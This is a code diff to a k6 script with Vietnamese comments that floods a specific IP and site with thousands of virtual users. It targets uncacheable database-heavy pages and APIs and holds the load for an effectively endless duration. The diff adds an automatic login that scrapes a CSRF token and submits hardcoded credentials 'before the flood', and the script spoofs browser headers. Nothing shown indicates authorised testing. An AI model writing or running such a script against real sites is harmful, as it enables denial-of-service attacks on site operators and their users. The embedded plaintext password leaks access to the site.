@@ -13,7 +13,12 @@ import { randomIntBetween, randomItem } from 'https://jslib.k6.io/k6-utils/1.4.0
 
 const IP_URL  = (__ENV.IP_URL   || 'http://103.211.206.175').replace(/\/+$/, '');
 const HOST    = __ENV.SITE_HOST || 'thanhhuyreal.com';
-const SESSION = __ENV.PHPSESSID || '9eb1fp03nuk8agokbvdekan4vc';
+
+// PHPSESSID: dung env var neu co, neu khong setup() se tu dong login
+const PHPSESSID_ENV = __ENV.PHPSESSID || '';
+
+const IDENTIFIER = __ENV.PHP_IDENTIFIER || 'lonussystem';
+const PASSWORD   = __ENV.PHP_PASSWORD   || 'lonussystem123@';
 
 // ===== Config =====
 const STAGES_RAW  = __ENV.STAGES      || '30s:500,60s:2000,60s:5000,876000h:5000';
@@ -29,24 +34,28 @@ const STAGES = STAGES_RAW.split(',').map(p => {
   return { duration: d.trim(), target: parseInt(t, 10) };
 });
 
-// ===== Headers chung (giả browser, có session) =====
-const HEADERS = {
-  'Host':              HOST,
-  'Cookie':           `PHPSESSID=${SESSION}`,
-  'User-Agent':       'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
-  'Accept':           'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
-  'Accept-Language':  'vi-VN,vi;q=0.9,en;q=0.8',
-  'Accept-Encoding':  'gzip, deflate',
-  'Connection':       'keep-alive',
-  'Cache-Control':    'no-cache',
-  'Pragma':           'no-cache',
-};
+// ===== Headers chung (dung session tu setup) =====
+function makeHeaders(session) {
+  return {
+    'Host':              HOST,
+    'Cookie':           `PHPSESSID=${session}`,
+    'User-Agent':       'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
+    'Accept':           'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
+    'Accept-Language':  'vi-VN,vi;q=0.9,en;q=0.8',
+    'Accept-Encoding':  'gzip, deflate',
+    'Connection':       'keep-alive',
+    'Cache-Control':    'no-cache',
+    'Pragma':           'no-cache',
+  };
+}
 
-const API_HEADERS = Object.assign({}, HEADERS, {
-  'Accept':           'application/json, text/javascript, */*; q=0.01',
-  'X-Requested-With': 'XMLHttpRequest',
-  'Content-Type':     'application/x-www-form-urlencoded; charset=UTF-8',
-});
+function makeApiHeaders(session) {
+  return Object.assign({}, makeHeaders(session), {
+    'Accept':           'application/json, text/javascript, */*; q=0.01',
+    'X-Requested-With': 'XMLHttpRequest',
+    'Content-Type':     'application/x-www-form-urlencoded; charset=UTF-8',
+  });
+}
 
 // ===== Endpoints nặng (DB query mỗi lần, không cache dc) =====
 // Thêm endpoint API cụ thể của site vào đây
@@ -95,6 +104,80 @@ const reqErr   = new Counter('req_error');
 const errRate  = new Rate('error_rate');
 const reqDur   = new Trend('req_duration');
 
+// ===== Auto-login: chay 1 lan truoc khi flood =====
+export function setup() {
+  // Neu co PHPSESSID san thi dung luon
+  if (PHPSESSID_ENV) {
+    console.log('Dung PHPSESSID tu env: ' + PHPSESSID_ENV.substring(0, 8) + '...');
+    return { session: PHPSESSID_ENV };
+  }
+
+  console.log('Auto-login: GET csrf token...');
+
+  // Buoc 1: GET trang login lay PHPSESSID + csrf_token
+  const loginPageRes = http.get(`${IP_URL}/?auth=login`, {
+    headers: {
+      'Host':       HOST,
+      'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
+      'Accept':     'text/html,application/xhtml+xml',
+    },
+    timeout: '30s',
+  });
+
+  if (loginPageRes.status !== 200) {
+    console.error('GET login page that bai: status=' + loginPageRes.status);
+    return { session: '' };
+  }
+
+  // Lay csrf_token tu HTML
+  const csrfMatch = loginPageRes.body.match(/name="csrf_token"\s+value="([^"]+)"/);
+  if (!csrfMatch) {
+    console.error('Khong tim thay csrf_token trong HTML');
+    return { session: '' };
+  }
+  const csrfToken = csrfMatch[1];
+  console.log('CSRF: ' + csrfToken.substring(0, 10) + '...');
+
+  // Lay PHPSESSID tu cookie
+  const cookieHeader = loginPageRes.headers['Set-Cookie'] || '';
+  const sessMatch = cookieHeader.match(/PHPSESSID=([^;]+)/);
+  const phpSessId = sessMatch ? sessMatch[1] : '';
+
+  // Buoc 2: POST login
+  const loginBody = [
+    `csrf_token=${encodeURIComponent(csrfToken)}`,
+    `identifier=${encodeURIComponent(IDENTIFIER)}`,
+    `password=${encodeURIComponent(PASSWORD)}`,
+  ].join('&');
+
+  const loginRes = http.post(`${IP_URL}/model/login`, loginBody, {
+    headers: {
+      'Host':              HOST,
+      'Cookie':            `PHPSESSID=${phpSessId}`,
+      'Content-Type':      'application/x-www-form-urlencoded; charset=UTF-8',
+      'Accept':            'application/json',
+      'X-Requested-With':  'XMLHttpRequest',
+      'User-Agent':        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
+      'Referer':           `http://${HOST}/?auth=login`,
+    },
+    timeout: '30s',
+  });
+
+  console.log('Login response status: ' + loginRes.status);
+
+  let json = null;
+  try { json = loginRes.json(); } catch(e) {}
+
+  if (json && json.status === true) {
+    console.log('Login THANH CONG! Session: ' + phpSessId.substring(0, 8) + '...');
+    return { session: phpSessId };
+  } else {
+    const msg = json ? JSON.stringify(json) : loginRes.body.substring(0, 100);
+    console.warn('Login that bai: ' + msg);
+    return { session: phpSessId }; // Dung session du chua xac nhan duoc
+  }
+}
+
 export const options = {
   discardResponseBodies: true, // Không parse body → tiết kiệm CPU
   scenarios: {
@@ -125,7 +208,8 @@ export const options = {
 };
 
 // ===== Hit trang HTML nặng =====
-export function hitPage() {
+export function hitPage(data) {
+  const HEADERS = makeHeaders(data.session);
   const fn  = HEAVY_PAGES[randomIntBetween(0, HEAVY_PAGES.length - 1)];
   const url = fn();
   const res = http.get(url, { headers: HEADERS, timeout: TIMEOUT, tags: { name: 'page' } });
@@ -143,7 +227,8 @@ export function hitPage() {
 }
 
 // ===== Hit API POST nặng =====
-export function hitApi() {
+export function hitApi(data) {
+  const API_HEADERS = makeApiHeaders(data.session);
   const fn  = HEAVY_APIS[randomIntBetween(0, HEAVY_APIS.length - 1)];
   const { url, body } = fn();
   const res = http.post(url, body, { headers: API_HEADERS, timeout: TIMEOUT, tags: { name: 'api' } });
